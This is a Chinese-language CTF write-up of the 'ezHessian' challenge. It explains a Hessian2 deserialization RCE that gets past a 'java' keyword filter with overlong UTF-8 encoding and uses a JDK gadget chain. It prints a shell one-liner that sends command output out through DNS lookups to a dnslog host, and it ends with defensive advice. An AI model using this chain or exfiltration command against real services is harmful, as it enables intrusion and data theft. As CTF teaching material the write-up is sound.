# ezHessian

## 题目简述

原始合并题解说明 ezHessian 是带字符串 WAF 的 Hessian2 反序列化接口：用户 payload 含 `java` 会被拦截，且环境只允许 DNS 出网。题解明确给出较旧 Hessian 版本、`Hessian2Input.readObject()` 入口与 JDK 原生 gadget 的组合；其主要障碍是 HTTP 暴露的 Hessian 反序列化及编码绕过，归 `web`。

## 解题过程

### 绕过序列化文本过滤

直接序列化 payload 中的类名会含 ASCII `java`。题解使用带 UTF-8 overlong encoding 的 `Hessian2Output` 写出 Hessian 字符串，使服务端 Hessian 解析可恢复类名，而输入侧的字节/字符串 `contains("java")` 不命中。此技巧只解决 Hessian 字符串字段；若把包含 `java` 的 class bytecode 直接塞进 payload，解码后的 bytecode 仍会触发过滤。

### 受限 RCE 与 DNS 回显

题解把 `SwingLazyValue` 放入基于 `TreeSet`、`Rdn$RdnEntry`、`MimeTypeParameterList`、`UIDefaults` 的 JDK gadget，在反序列化比较/字符串化路径上调用 `MethodUtil.invoke`，最终执行 `Runtime.exec(new String[]{"sh","-c", command})`。由于普通 stdout 不回传，命令将 `/readflag give me the flag` 的输出十六进制化、裁剪后编码到受控 DNS 名称，再以 `ping` 或 `wget` 触发解析：

```sh
echo "$(/readflag give me the flag | xxd -p -c 256 | sed 's/^\(.\{50\}\).*$/\1/').dnslog" | xargs ping
```

Alpine 镜像不保证有 `curl`，故不能把 curl 当作必要条件。DNS 记录中的十六进制片段再按原顺序解码即可恢复 flag。

### 验证

有效验证包括：编码后请求不含被 WAF 匹配的 ASCII `java`，服务器确实进入 `Hessian2Input.readObject()`，以及 DNS 日志收到命令输出编码。当前源范围没有 ezHessian 服务源码、依赖或实际 DNS 记录，本文仅整理合并题解已给出的链路，不伪造回包。

## 方法总结

- 核心技巧：让 Hessian 解释的字符串与 WAF 看到的字节不同，再以 JDK gadget 获得命令执行。
- 识别信号：Hessian2 入口、针对 `java` 的字符串封禁、低版本/无反序列化黑名单，以及无 HTTP 回显的容器环境。
- 复用要点：对文本编码的过滤必须在规范化解码后执行；彻底修复是禁止反序列化不可信 Hessian 对象，而非添加关键字。
